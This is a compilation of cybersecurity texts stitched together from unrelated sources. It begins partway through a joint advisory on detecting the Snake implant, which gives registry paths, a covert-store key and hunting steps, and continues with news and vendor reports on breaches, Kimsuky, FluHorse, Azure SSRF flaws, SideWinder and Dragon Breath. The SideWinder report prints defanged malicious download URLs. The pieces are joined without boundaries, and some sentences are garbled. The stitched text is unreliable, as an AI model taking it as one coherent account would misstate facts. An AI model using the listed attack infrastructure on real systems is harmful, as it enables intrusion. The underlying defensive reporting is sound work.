of the stored communication channels chosen at random. Once the data is off the end point node, operators generally retrieve it manually or using a script. The Item Type field, which is unique per executed Snake command, is needed to associate the exfiltrated data with the target node on which the command was run.In the context of Passive Snake communications, the term Item Type is defined as a UID for a given Snake command and its resulting data. The Item Type serves as a unique identifier to associate the results of command execution with the original command written by the operator. When the FSB collects the data, Snake knows exactly what infection the data came from, and therefore it can determine what key to use to successfully decrypt the data.To illustrate how Passive operations are conducted between the end points, the operator, and the hop points in between, see the diagram above, which is explained further by the following steps:A number of complementary detection techniques effectively identify some of the more recent variants of Snake. However, as described above, Snake is purpose-built to avoid large-scale detection. Below is a discussion of the advantages and disadvantages of various detection methodologies available for Snake.Note that some of the techniques identified in this section can affect the availability or stability of a system. Defenders should follow organizational policies and incident response best practices to minimize the risk to operations while hunting for Snake.Network Intrusion Detection Systems (NIDS) can feasibly identify some of the more recent variants of Snake and its custom network protocols as detailed above.Advantages: High-confidence, large-scale (network-wide) detection of custom Snake communication protocols.Disadvantages: Low visibility of Snake implant operations and encrypted data in transit. There is some potential for false positives in the Snake http, http2, and tcp signatures. Snake operators can easily change network-based signatures.Snake client-to-server http and http2 traffic is contained within an arbitrary HTTP header field. The header field value for http begins with 10 pure alphanumeric characters, followed by base64 encoding of 8 bytes, which yields exactly 11 valid base64 characters plus one base64 padding character.The following two Suricata rules will detect the traffic described:The header field value for http2 begins with 22 pure alphanumeric characters (base62 with non-extraneous characters), followed by the base62 encoding of at least 8 bytes, which must comprise at least 11 base62 characters with the four extraneous characters allowed. The actual requirement is stricter than this expression, since the total number of non-extraneous characters alone must equal or exceed 11; however, it is not possible to encode that aspect into a regular language.The following two Suricata rules will detect the traffic described:The client-to-server communication for tcp must begin with the ustart, which is not captured in this signature set. Immediately following the ustart, the next client-to-server communication must be the big-endian 32-bit unsigned integer 8 followed by any 8 bytes of data. The next communication must also be client-to-server, and it must comprise the big-endian 32-bit unsigned integer 4 followed by any 4 bytes of data. The next two communications must be server-to-client, comprising the integer 8 followed by 8 bytes of data and the integer 4 followed by 4 bytes of data.The following six Suricata rules will, in conjunction, detect traffic of the form described:Advantages: High confidence based on totality of positive hits for host-based artifacts.Disadvantages: Many of the artifacts on the host are easily shifted to exist in a different location or with a different name. As the files are fully encrypted, accurately identifying these files is difficult.The Snake covert store comprises a file-backed NTFS (usually) or FAT-16 (rarely) filesystem. The filesystem is encrypted with CAST-128 in CBC mode. The encryption key can be either statically hardcoded or dynamically stored in a specified Windows registry location. The IV is 8 bytes, since CAST-128 has an 8-byte block length. The first byte of the IV for any 512-byte block of the covert store is the 0-indexed block number. The remaining bytes of the IV are the corresponding bytes of the key, meaning that bytes at 0-indexed indices 1 through 7 of the IV are the bytes at 0-indexed indices 1 through 7 of the key.When stored in the Windows registry, the encryption key is the classname associated with the following key:The following initial 8-byte sequences are known to be used by NTFS or FAT-16 filesystems as observed:For tool development, the following test vector illustrates the encryption of the first given header above (EB 52 90 …) using CAST-128 with the default key shown above and the IV constructed as described, given this header occurs at the beginning of the first 512-byte block of the covert store.      Plaintext:      EB 52 90 4E 54 46 53 20\n      Key:              A1 D2 10 B7 60 5E DA 0F A1 65 AF EF 79 C3 66 FA\n      IV:                 00 D2 10 B7 60 5E DA 0F      Ciphertext:   C2 C7 F4 CA F7 DA 3A C8By encrypting each possible initial filesystem byte sequence with CAST-128 using the key obtained from the registry—or the default encryption key if the registry entry does not exist—and searching for any file with a size that is an even multiple of 220, it is possible to efficiently detect Snake covert stores. Validation can be performed by decrypting the entire file using the outlined methodology and then verifying that it comprises an NTFS or FAT-16 filesystem.Registry BlobThe registry blob is generally found at the location listed below. In case it is not present at its typical location, the registry blob can be found by searching the full registry for a value of at least 0x1000 bytes in size and entropy of at least 7.9.      Typical Name: Unknown (RegBlob)\n      Typical Path: HKLM\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds\n      Characteristics: High EntropyQueue File      Typical Name: < RANDOM_GUID >.<RANDOM_GUID>.crmlog      Typical Path: %windows\\registration\\      Unique Characteristics: High Entropy, file attributes of hidden, system, and archive      Role: Snake Queue FileThe Snake Queue File generally has a predictable path and filename structure, in addition to being high entropy. The Snake Queue File can be located by scanning all files in the typical queue path with filenames matching a regular expression that captures the typical naming convention. Files meeting these criteria should be scanned for high entropy, which is performed by the Yara rule below:The following UNIX find command will scan files with names matching the GUID-based convention (note that the HighEntropy yara rule is assumed to be contained in a file named “1.yar”):The following PowerShell command does the same:Comadmin      Typical Name: comadmin.dat      Typical Path: %windows%\\system32\\Com      Unique Characteristics: High Entropy      Role: Houses Snake’s kernel driver and the driver’s loaderThe Snake Comadmin file can be found using analogous techniques to that presented above for locating the Snake Queue File. The following UNIX find command will do so:The following PowerShell command does the same:WerfaultTypical Name: Werfault.exeTypical Path: %windows%\\WinSxS\\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a0502\\Unique Characteristics: Icon is different than that of a valid Windows Werfault.exe fileRole: Persistence mechanismThe Snake Werfault.exe file has non-standard icon sizes, which form the basis of the Yara rule below. This rule should be run on all files in the typical path, specifically the %Windows%\\WinSxS directory.Advantages: High confidence as memory provides the greatest level of visibility into Snake’s behaviors and artifacts.Disadvantages: Potential impact on system stability, difficult scalability.Capturing and analyzing the memory of a system will be the most effective approach in detecting Snake because it bypasses many of the behaviors that Snake employs to hide itself. With a memory analysis tool, such as Volatility, detection of a Snake compromise may be possible.\nSnake’s principal user mode component is injected into a chosen process via a single allocation of PAGE_EXECUTE_READWRITE memory. The starting offset is generally 0x20000000, however the module does allow for relocation if needed. Additionally, since the user mode component is not obfuscated in any way, a valid PE header can be located at the beginning of the allocated memory region. Further validation can be performed by confirming the presence of strings known to exist in the user mode component also within the memory region. A plugin compatible with Volatility3 which can scan all processes on a system using this method is provided in the Appendix. A screenshot showing the results of the plugin successfully detecting Snake is displayed below.Note that the mitigations that follow are not meant to protect against the initial access vector and are only designed to prevent Snake’s persistence and hiding techniques.System owners who are believed to be compromised by Snake are advised to change their credentials immediately (from a non-compromised system) and to not use any type of passwords similar to those used before. Snake employs a keylogger functionality that routinely returns logs back to FSB operators. Changing passwords and usernames to values which cannot be brute forced or guessed based on old passwords is recommended.System owners are advised to apply updates to their Operating Systems. Modern versions of Windows, Linux, and MacOS make it much harder for adversaries to operate in the kernel space. This will make it much harder for FSB actors to load Snake’s kernel driver on the target system.If system owners receive detection signatures of Snake implant activity or have other indicators of compromise that are associated with FSB actors using Snake, the impacted organization should immediately initiate their documented incident response plan.We recommend implementing the following Cross-Sector Cybersecurity Performance Goals (CPGs) to help defend against FSB actors using Snake, or mitigate negative impacts post-compromise:CPG 2.A: Changing Default Passwords will prevent FSB actors from compromising default credentials to gain initial access or move laterally within a network.CPG 2.B: Requiring Minimum Password Strength across an organization will prevent FSB actors from being able to successfully conduct password spraying or cracking operations. CPG 2.C: Requiring Unique Credentials will prevent FSB actors from compromising valid accounts through password spraying or brute force. CPG 2.E Separating User and Privileged Accounts will make it harder for FSB actors to gain access to administrator credentials.CPG 2.F. Network Segmentation to deny all connections by default unless explicitly required for specific system functionality, and ensure all incoming communication is going through a properly configured firewall.CPG 2.H Implementing Phishing Resistant MFA adds an additional layer of security even when account credentials are compromised and can mitigate a variety of attacks towards valid accounts, to include brute forcing passwords and exploiting external remote services software.CPG 4.C. Deploy Security.txt Files to ensure all public facing web domains have a security.txt file that conforms to the recommendations in RFC 9118.This advisory was developed as a joint effort by an international partnership of multiple agencies in furtherance of the respective cybersecurity missions of each of the partner agencies, including our responsibilities to develop and issue cybersecurity specifications and mitigations.

      "text": "  Murfreesboro Medical Clinic & SurgiCenter was forced offline after a cyberattack was deployed on April 22. In response, the Tennessee provider closed all operations and launched an emergency shutdown of the network to prevent the attack from spreading.MMC operations were completely shut down for almost two weeks until May 4. The latest update shows that while officials hoped to restore some walk-in services on May 3, the systems weren’t ready to go back online.At 10 a.m. on  May 4, MMC began accepting patients at its Pediatrics and Internal & Family Medicine walk-in clinics for “sick visits.” However, the site is still not accepting regular appointments, and the majority of its approximate 11 locations remain closed.Patients took to social media to express concern over missed appointments, closures and prescription refills. An MMC spokesperson is promptly responding to those comments. But some are frustrated at response times, as well as long waits when calling into the health system with questions. MMC is working with law enforcement and an outside firm to investigate the incident and identify the source and scope of the attack to return to normal clinic operations. Officials said: “Our first priority was to contain the incident and protect our patients and employees.”The team is still working to restore the “systems safely with enhanced security features and controls” and is already working to strengthen its infrastructure to prevent a recurrence. Officials said “the quick detection by its technology experts” limited the impact of the attack.“Preserving sensitive patient and employee information is of the utmost importance to MMC, but like so many other organizations around the country and despite its best efforts, MMC has found itself as the target of criminals attempting to steal personal or company data,” Joey Peay, MMC CEO, said in a statement.MMC is working to ensure the “computer infrastructure is secure and free of any harmful software,” he added. “We apologize for the vagueness of our recent communications, but we did not want to do anything that would impede law enforcement’s investigative efforts.”The recovery team has not yet confirmed whether any specific patient, employee or corporate data was accessed or removed from the network. Patients and employees of MMC are being urged to monitor their personal data for any misuse.A fourth provider, Cornwall Community Hospital in Ontario, faced patient care delays and a loss of access to its patient portal after a cyberattack on April 11.Pediatric behavioral health provider Brightline is notifying at least 964,300 patients and 60 of its connected vendors that their data was accessed and exfiltrated by threat actors during a hack of its Fortra GoAnywhere MFT software-as-a-service in January.The GoAnywhere platform is used for the secure transfer of encrypted files between business partners and maintains detailed access logs for files.Fortra warned clients of the zero-exploit in its file transfer solution’s admin console in early February and provided a workaround as it worked on a patch. However, cybercriminals quickly released an active exploit that targeted the 1,000 exposed on-prem GoAnywhere MFT instances, or about 130 entities.The Brightline notification mirrors these earlier notices: that Fortra “was made aware of suspicious activity within certain instances of its GoAnywhere MFT service” in January. An investigation found a previously unknown vulnerability that allowed an attacker to access certain customer accounts and download files.Brightline was notified of the vulnerability on Feb. 4 and launched a review, which confirmed the access to its Fortra service. While its network was not hacked, the threat actors were able to acquire “certain files” saved in the platform.The data varied by patient but could include names, contact information, dates of birth, member identification numbers, dates of plan coverage, and/or employer names. Brightline says Aetna member IDs were not compromised during the hack.Fortra has since deactivated the hacker’s credentials, turned off the service, and rebuilt Brightline’s version of the platform to remove the vulnerability. Brightline bolstered its own security, as well, which included limiting ongoing access to verified users, removing all data from the service, and reducing data exposure until the shift to an alternative file transfer service.The Fortra GoAnywhere hack mirrors the massive Accellion File Transfer Application attack reported in early 2021. The hack of a known vulnerability in the platform enabled access to hundreds of client systems and was easily the largest healthcare data breach reported in 2021, with over 3.51 million patients affected.The GoAnywhere hack has affected companies in a range of sectors, including Nintendo of America, Washington Trust Bank, Boston Children’s Hospital, and a host of others.The healthcare entity with the largest impact so far, appears to be NationsBenefits Holdings. The supplemental benefits provider reported the incident to HHS as affecting 3.04 million patients, making the GoAnywhere hack the largest healthcare data breach reported so far this year with well over 4 million individuals impacted.Detected after an alert from the security team on Feb. 7, the hack impacted two NationsBenefits servers. The response team scanned the environment with “multiple security tools and confirmed the threat actors didn’t access any applications or systems beyond the Fortra GoAnywhere MFT environment.”Further, the team found no evidence that the attackers had moved laterally from the vulnerable servers. The exfiltrated data was tied to patients of multiple insurance companies, including Aetna ACE, Elevance Health, and UAW Retiree Medical Benefits.Since discovery, NationsBenefits took its GoAnywhere server permanently offline and implemented a new file transfer solution separate from Fortra software.“NationsBenefits implements a comprehensive, written security and privacy program that includes technical, physical, and administrative safeguards,” officials said in a statement. “Even prior to the zero-day vulnerability becoming known, NationsBenefits’ layered security controls. blocked certain malicious activity, limiting the impact of this incident.”This story has been updated with an increase in the overall breach tally and with a correction to the timeframe of Brightline's breach notice to patients.The voice of healthcare cybersecurity and policy for SC Media, CyberRisk Alliance, driving industry-specific coverage of what matters most to healthcare and continuing to build relationships with industry stakeholders.Okta had 4,961 current and former employees' data, including names, health insurance plan numbers, and Social Security numbers, compromised following a breach at its third-party vendor Rightway Healthcare, reports The Register.Threat actors using private keys and passphrases from LastPass databases stolen in cyberattacks last August and December were reported by ZachXBT and MetaMask developer Taylor Monahan to have been able to exfiltrate $4.4 million worth of cryptocurrency on Oct. 25, BleepingComputer reports.The three companies claim no sensitive customer data was lost despite being targeted after the breach of the identity and access management firm.On-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "text": " North Korean cyber espionage group Kimsuky has expanded its attack arsenal with a new spear-phishing campaign that uses Microsoft OneDrive links in documents armed with malicious macros that drop novel reconnaissance malware.ReconShark can exfiltrate information, including deployed detection mechanisms and hardware information — to gain access to targeted networks, basing their assessment on overlaps in file-naming conventions, used malware staging techniques, and code format, the researchers said.The malware appears to be \"part of a Kimsuky-orchestrated reconnaissance operation that enables subsequent precision attacks, possibly involving malware specifically tailored to evade defenses and exploit platform weaknesses,\" the researchers wrote in the post.While spear-phishing is often part of Kimsuky's modus operandi, the group is paying special attention to craft emails in the latest campaign carefully, so they don't raise suspicion, the researchers said.\"[They] are made with a level of design quality tuned for specific individuals, increasing the likelihood of opening by the target,\" the researchers wrote. \"This includes proper formatting, grammar, and visual clues, appearing legitimate to unsuspecting users.\"Notably, the targeted emails, which contain links to download malicious documents, and the malicious documents themselves, abuse the names of real individuals whose expertise is relevant to the lure subject, such as political scientists, the researchers said.The campaign against KRG specifically used Microsoft OneDrive to host the malicious document — which contains macros that execute ReconShark — presented for download in the message.For example, a lure email used in the campaign included a OneDrive shared file link to a password protected document file named \"Research Proposal-Haowen Song.doc\" that contained a malicious macro for downloading the malware, they said.Once downloaded, the main responsibility of ReconShark is to exfiltrate information about the infected platform, such as running processes, information about the battery connected to the system, and deployed endpoint threat detection mechanisms, the researchers said. The malware is similar to previous BabyShark variants in its reliance on Windows Management Instrumentation (WMI) to query process and battery information, they added.However, ReconShark can do more than just steal data about the targeted system, the researchers said. It also can deploy further payloads in a multi-stage manner that are implemented as scripts (VBS, HTA, and Windows Batch), macro-enabled Microsoft Office templates, or Windows DLL files, they said.\"ReconShark decides what payloads to deploy depending on what detection mechanism processes run on infected machines,\" the researchers wrote in the post.\"We have seen a triple-digit increase in attacks on educational institutions in the US in the last year, which is driven by a perfect storm from an attacker's perspective: Extremely valuable data, and lacking defenses,\" he tells Dark Reading in an email.Overall, organizations can thwart attacks from Kimsuky and other actors' spear-phishing campaigns in general by practicing overall good email security hygiene, such as employing scanning tools to check incoming messages for suspicious activity, so they are flagged before they even reach users.Educating employees and anyone else using an organization's email system can also help them spot malicious messages that slip through other security defenses and thus avoid compromise, experts said.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " Various sectors in East Asian markets have been subjected to a new email phishing campaign that distributes a previously undocumented strain of Android malware called FluHorse that abuses the Flutter software development framework.The malicious apps have been found to imitate popular apps like ETC and VPBank Neo, which are widely used in Taiwan and Vietnam. Evidence gathered so far shows that the activity has been active since at least May 2022. Once installed, the malware requests for SMS permissions and prompts the user to input their credentials and credit card information, all of which is subsequently exfiltrated to a remote server in the background while the victim is asked to wait for several minutes.The threat actors also abuse their access to SMS messages to intercept all incoming 2FA codes and redirect them to the command-and-control server.The Israeli cybersecurity firm said it further identified a dating app that redirected Chinese-speaking users to rogue landing pages that are designed to capture credit card information.Several high-profile organizations are said to be among the recipients of these phishing emails, including employees of the government sector and large industrial companies, with new infrastructure and fraudulent applications showing up every month.While threat actors are known to use a variety of tricks like evasion techniques, obfuscation, and long delays before execution to resist analysis and get around virtual environments, the use of Flutter marks a new level of sophistication.\"The malware developers did not put much effort into the programming, instead relying on Flutter as a developing platform,\" the researchers concluded.\"This approach allowed them to create dangerous and mostly undetected malicious applications. One of the benefits of using Flutter is that its hard-to-analyze nature renders many contemporary security solutions worthless.\"Join us for our webinar to learn how to tackle challenges, launch a program, and choose the right solution.Join the conversation with security gurus to learn about technologies that can shield your web apps from stealthy attacks.Sign up for free and start receiving your daily dose of cybersecurity news, insights and tips."

The stolen data can include credentials, credit card numbers, personal identifiable information, medical records, software code, and proprietary technologies. Data theft occurs both inside and outside an organization.Malicious actors can steal data from organizations or individuals to sell it to other malicious actors. Data theft is a major risk for many organizations because it can result in identity theft, reputation damage, and financial loss.Threat actors steal data from organizations using various techniques. The common causes of data theft are as follows:Organizations that are data theft victims can suffer the following consequences:It provides a centralized view for threat detection and security monitoring across virtualized, on-premises, cloud-based, and containerized environments.The File Integrity Monitoring (FIM) module monitors an endpoint’s files and directories. It triggers an alert when there is a file creation, modification, or deletion.Malicious actors use malware to steal data from endpoints. This malware creates or downloads malicious files on the infected endpoints. The Wazuh FIM module detects when these files are created or downloaded on the infected endpoints.Wazuh builds a global vulnerability database from publicly available Common Vulnerabilities and Exposures (CVE) repositories. Wazuh then uses this database to cross-correlate the application inventory data collected from monitored endpoints to detect vulnerable software.The Wazuh Vulnerability Detector module can discover unpatched vulnerabilities on endpoints that malicious actors can exploit to steal data.Security configuration assessment is the process of scanning monitored endpoints to discover misconfigurations that can expose such endpoints to cyber attacks.SCA continuously improves system configuration posture by adopting standards such as the Center of Internet Security (CIS), NIST, PCI-DSS, HIPAA, and many more.Wazuh SCA can discover unnecessary services, default credentials, insecure protocols, and ports on monitored endpoints that malicious actors can exploit to steal data.Log data analysis is the process of reviewing logs generated from devices to detect cyber threats and identify security bugs and risks.Disgruntled employees or malicious actors can use USB drives to steal sensitive data from an organization’s endpoint. Wazuh collects and analyzes the event logs generated when a USB drive is inserted into an endpoint.Organizations face the risk of data theft if they fail to implement effective security controls. The impact of data theft can be highly devastating to organizations. Hence, organizations can leverage various capabilities of Wazuh to detect data theft effectively."

      "text": " Microsoft has patched three vulnerabilities in its Azure cloud platform that could have allowed attackers to access sensitive info on a targeted service, deny access to the server, or scan the internal network to mount further attacks, researchers have found.Researchers from the Ermetic Research Team discovered the flaws in the Azure API Management Service, which allows organizations to create, manage, secure, and monitor APIs across all of their environments, they revealed in a blog post published May 4.SSRF allows an attacker to send a crafted request from a vulnerable server to a targeted external or internal server or service, or even target it in a denial-of-service (DoS) attack. Abusing these flaws means an attacker can access sensitive data stored on the targeted server, overload targeted servers using DoS attacks, and scan the internal network and identify potential targets for further attacks.Specifically, the Ermetic researchers discovered two separate SSRF flaws: one that affected the Azure API Management CORS Proxy and another that affected the Azure API Management Hosting Proxy.Together, the Azure SSRF flaws that researchers discovered affected central servers that \"masses of users and organizations depend on for day-to-day operations,\" says Liv Matan, cloud security researcher at Ermetic.\"Using them, attackers could fake requests from these legitimate servers, access internal services that may contain sensitive information belonging to Azure customers, and even prevent the availability of the vulnerable servers,\" he says.The path-traversal flaw found in Azure API Management Service allowed for an unrestricted file upload to the Azure developer portal server, the researchers said. The developer portal's authenticated mode allowed someone to upload static files and images that would be shown on a developer's dedicated portal, they said.The flaw could have allowed attackers to take advantage of Microsoft's self-hosted developer portal as well as weaponize the vulnerability against end users, Matan explains.\"Additionally, the Azure-hosted developer portal contains customer information that would have been at risk if the vulnerability had fallen into the wrong hands,\" he says.While API flaws like the ones Ermetic researchers discovered are uncommon, awareness of these types of vulnerabilities has grown in the past few years, Matan says.Moreover, \"blind SSRFs\" — SSRF flaws that do not necessarily return any data but rather focus on performing unauthorized actions on the server’s backend — are fairly common, especially in cloud platforms that offer a wide range of services, he says.\"In the end, vulnerabilities can be discovered in any cloud platform, at any time,\" Matan says.There's certainly been evidence of this, as — aside from SSRF flaws — researchers already have found a number of other flaws in Azure as well as other cloud platforms that could have threatened enterprise environments.Because it's difficult for an enterprise deploying a cloud to have control over or even be aware of a flaw on the underlying cloud-hosting infrastructure, it's important for organizations to be vigilant in their own security practices so they are prepared if a flaw is eventually discovered or exploited, the researchers said.In the case of avoiding compromising in the recently discovered Azure API Management, Matan recommends that organizations should practice proper input-validation hygiene and configure their servers to not follow redirects.\"To avoid a compromise in these cases, organizations should validate all input received from untrusted sources, such as user inputs or HTTP requests,\" he says.Other steps organizations can take to avoid compromise in these cases, Matan adds, include using a whitelist approach, implementing a strong firewall to restrict outgoing traffic from the application to only necessary services and ports, isolating data, and managing permissions on the server in cloud environments using IMDSv2.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

This campaign utilized a server-side polymorphism technique. The use of this technique allows the threat actor to potentially bypass traditional signature-based antivirus (AV) detection to deliver the next stage payload.MD5SHA256666b2b178ce52e30be9e69de93cc60a9cd09bf437f46210521ad5c21891414f236e29aa6869906820c7c9dc2b565d8beFile NameGUIDELINES FOR JOURNAL - 2023 PAKISTAN NAVY WAR COLLEGE (PNWC).docxFile Size12.81 KB (13115 bytes)Created2022-11-30 04:52:00 UTCAuthorWindows UserLast Modified2022-11-30T05:44:00ZLast Modified byWindows UserThe SideWinder APT group’s new campaign leveraging server-side polymorphism to deliver the next stage payload began in late November 2022. The malicious documents used in this campaign were created to target Pakistan government officials. The documents were designed to trick Pakistan officials by displaying convincing content relevant to their interests.During the investigation, the BlackBerry Threat Research and Intelligence team analyzed the documents used by the threat group to identify various artefacts used in this campaign to potentially locate other files of interest. The first malicious lure we examined was a document titled “GUIDELINES FOR BEACON JOURNAL – 2023 PAKISTAN NAVY WAR COLLEGE (PNWC)”.Figure 1: Malicious lure document targeting Pakistan officials\r\n MD5SHA2563b853ae547346befe5f3d06290635cf6bc9d4eb09711f92e4e260efcf7e48906dca6bf239841e976972fd74dac412e2fFile NamePK_P_GAA_A1_Offerred.docxFile Size36.35 KB (37220 bytes)Created2022-12-06 05:24:37 UTCAuthorWindows UserLast Modified2022-12-06T05:24:37ZLast Modified byWindows User\r\nAnother malicious document that was used in early December 2022 was titled “PK_P_GAA_A1_Offerred.docx”. In this instance, the document was eight pages in length and pretended to be a letter of offer and acceptance “for the purchase of defense articles, defense services, or both.”Figure 2: First malicious lure sent by the SideWinder APT groupThe “GUIDELINES FOR JOURNAL - 2023 PAKISTAN NAVY WAR COLLEGE (PNWC).doc“ malicious lure template was instructed to reach out to the remote address of “hxxps[:]//pnwc[.]bol-north[.]com/5808/1/3686/2/0/0/0/m/files-a2e589d2/file[.]rtf”. The “pnwc[.]bol-north[.]com” domain in this instance resolves to the IP address 5.230.73[.]106.Figure 3: The URL for the next stage downloadThe “PK_P_GAA_A1_Offerred.docx” malicious lure template was instructed to reach out to the remote address of “hxxps[:]//paknavy-gov-pkp[.]downld[.]net/14578/1/6277/2/0/0/0/m/files-75dc2b1e/file[.]rtf” to download the next stage. The “paknavy-gov-pk[.]downld[.]net” domain resolves to the IP address 185.205.187[.]234.Figure 4: URL for next stage downloadDuring the time when the malicious server was active, this threat group had set their servers in a way that if the user/victim enters part of the malicious URL into their browser, they will be redirected to the legitimate Pakistan Navy home page, which is hxxps[:]//www[.]paknavy[.]gov[.]pk. It is important to note that the malicious server is no longer active.Figure 5: Legitimate Pakistan Navy website. The victim is redirected to this site from a malicious page.In early March, we discovered a new document that was also spread through phishing emails. The peculiarity of this OLE document was that it contained the address of the connection to the malicious server, which was also configured to connect to victims from Turkey.MD5SHA256b7e63b7247be18cdfb36c1f3200c1dba8af93bed967925b3e5a70d0ad90eae1f13bc6e362ae3dac705e984f8697aaaadFile NameProduct.docxFile Size579.69 KB (593604 bytes)Created2023-03-07 13:54:00 UTCAuthoruserLast Modified2023-03-07T13:56:00ZLast Modified byuserThe next stage payload “file.rtf”, a rich text document file, can only be downloaded by users in the Pakistani IP range. It is important to note that in both instances, only the name of the file “file.rtf” and the file type are the same; however, the contents, file size and the file hash are different. This is an example of server-based polymorphism, where each time the server responds with a different version of file, so bypassing the victim’s antivirus scanner (presuming the antivirus uses signature-based detection).If the user is not in the Pakistani IP range, the server returns an 8-byte RTF file (file.rtf) that contains a single string: {\\rtf1 }. However, if the user is within the Pakistani IP range, the server then returns the RTF payload, which varies between 406KB – 414KB in size.Figure 6: \"file.rtf\" malicious payloadHaving listed the existing objects in the “file.rtf” file that was obtained from “paknavy-gov-pk[.]downld[.]net” domain, the “1.a” object was extracted for further analysis. Figure 7: \"1.a\" object overviewDuring the malware execution chain, this object is saved under the “C:\\Users\\user\\AppData\\Local\\Temp\\1.a” location on the victim’s machine. The “1.a” file is an obfuscated JavaScript.Figure 8: De-obfuscated stringsThere are two things that stand out from our analysis – the base64 encoded data blob, and two URLs. The base64 data blob decodes to Win32 DLL(App.dll), and the two URLs are used for further communications with the threat actor. Figure 9: URLs used for further communications with SideWinderThe previously mentioned base64 encoded data blob is a .NET compiled Win32 DLL called “App.dll”.Hashes (md5, sha-256)8934f22ed2d4390f2e6170e4cfdbd4838b718a15f76768ba29849a5f4a6ca0ff1d9c8ba7bcdc9d89efc792fe20e9fdb5ITW File NameApp.dllCompilation StampFri Nov 16 02:26:21 2074File Type/SignatureDLLFile Size139339 (bytes)Compiler Name/VersionMicrosoft Visual C# / Basic .NET\r\nTo further avoid static signature-based detection, the “App.dll” file is obfuscated in the same way as the majority of other files and scripts uncovered in this campaign. Figure 10: \"App.dll\" fileThe “App.dll” file is launched by earlier stage JavaScript code. The JavaScript deserializes the .NET binary and passes a URL to the executable's “Work()” function. This function makes a request to the URL and attempts to decrypt and then execute the response. In other words, the .NET executable can retrieve the next stage code and execute it.For these campaigns, SideWinder also uses predictable URL structures when hosting their malicious files:\nThe longevity of these tactics, techniques, and procedures (TTPs) – nearly 2 years – gives us confidence that they can be utilized for the detection of future campaigns.In mid-March 2023, we discovered a new configured server delivering the payload. This server was different in that it was configured so that a victim in Turkey could receive a second-stage payload. This shows that this threat actor is also now targeting organizations in Turkey.The SideWinder group’s main target remains Pakistan government organizations. The campaign investigated by BlackBerry in early March 2023 identified Turkey as a new target.The SideWinder APT group’s primary targets are in Southeast Asia regions such as Pakistan and Sri Lanka; however, government institutions in Pakistan still remain their main target of interest.The BlackBerry Threat Research and Intelligence team is actively monitoring this threat group’s tooling and malicious files.

      "text": " \"The latest campaigns add a twist in which a first-stage clean application 'side'-loads a second clean application and auto-executes it. The second clean application side-loads the malicious loader DLL. After that, the malicious loader DLL executes the final payload.\"The double-dip DLL side-loading strategy, per Sophos, has been leveraged in attacks targeting users in the Philippines, Japan, Taiwan, Singapore, Hong Kong, and China. These attempted intrusions were ultimately unsuccessful.The initial vector is a fake website hosting an installer for Telegram that, when opened, creates a desktop shortcut that's designed to load malicious components behind the scenes upon launch, while also displaying to the victim the Telegram app user interface.What's more, the adversary is believed to have created multiple variations of the scheme in which tampered installers for other apps, such as LetsVPN and WhatsApp, are used to initiate the attack chain.The next stage involves the use of a second clean application as an intermediate to avoid detection and load the final payload via a malicious DLL.The payload functions as a backdoor capable of downloading and executing files, clearing event logs, extracting and setting clipboard content, running arbitrary commands, and stealing cryptocurrency from the MetaMask wallet extension for Google Chrome.\"DLL sideloading, first identified in Windows products in 2010 but prevalent across multiple platforms, continues to be an effective and appealing tactic for threat actors,\" Szappanos said.\"This double-clean-app technique employed by the Dragon Breath group, targeting a user sector (online gambling) that has traditionally been less scrutinized by security researchers, represents the continued vitality of this approach.\"Join us for our webinar to learn how to tackle challenges, launch a program, and choose the right solution.Join the conversation with security gurus to learn about technologies that can shield your web apps from stealthy attacks.Sign up for free and start receiving your daily dose of cybersecurity news, insights and tips."

      "title": "Google adds passkeys for user accounts; 'passwords are dead,' official says | SC Media",
      "text": "  Google rolled out passkeys for user accounts on May 3 as part of its planned effort to provide secure access to its platforms without the use of passwords. Passkeys are designed to eventually replace passwords, as they’re viewed as a more secure authentication method than passwords. The method enables users to sign into apps and sites using the same authentication to unlock devices with a face scan, fingerprint or PIN. Brand touted the importance of passkeys at the RSA 2023 Conference last week in San Francisco, noting the passkey plan began nearly 10 years ago in hopes of shifting “the world away from passwords.”“We are finally at the mass point where a shift away from passwords to passkeys is starting to happen,” said Brand. “That means we can start to move away from the legacy Band-Aids we’ve used for passwords over the years, things like two-factor authentication and multi-factor authentication.”“Those [tools] are Band-Aids we put on our passwords because they didn’t live up to the expectation that we had for them,” he continued. “Passkeys are kind of a clean slate. At the same time, it's a migration away from all the hassles regarding passwords.”Passkeys are much more secure, like a purposeful framework built on a strong foundation, he explained. The tool should be considered an alternative to these customized authentication solutions that are still based on the password model. Most of these alternatives are just “passwords with additional layers on top.”The goal of passkeys is to mimic the manner in which everyone leverages transport layer encryption, Brand explained. TLS is built right into the platform, he continued: “There's not even a conversation about it, we use TLS, and that's the end of the story.”The tool is made up of a public key and private key, which solves the issue of password reuse and less data loss when there’s a breach. Brand stressed that the public-private key credentials are phishing resistant, as they aren't credentials with a single string — it’s a cryptographic key.“There’s no way that the user can read part of the cryptographic key from the device,” he explained.The use must be physically present on both the phone, which is used for pairing, and the device in which they’re attempting to log-on.The voice of healthcare cybersecurity and policy for SC Media, CyberRisk Alliance, driving industry-specific coverage of what matters most to healthcare and continuing to build relationships with industry stakeholders.TechCrunch reports that more than a million Maine residents were confirmed by state government officials to have had their personal data compromised as part of the widespread MOVEit file transfer system hack conducted by the Cl0p ransomware operation.U.S. advanced electronic components manufacturer Kyocera AVX Components Corporation has disclosed that 39,111 individuals around the world had their data compromised following a ransomware attack earlier this year, which has been claimed by the LockBit ransomware operation, reports BleepingComputer.U.S. cloud data analytics and log analysis firm Sumo Logic has confirmed discovering a potential security incident after its Amazon Web Services account was accessed using stolen credentials, reports TechCrunch.Thu Dec 7Tue Mar 26On-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

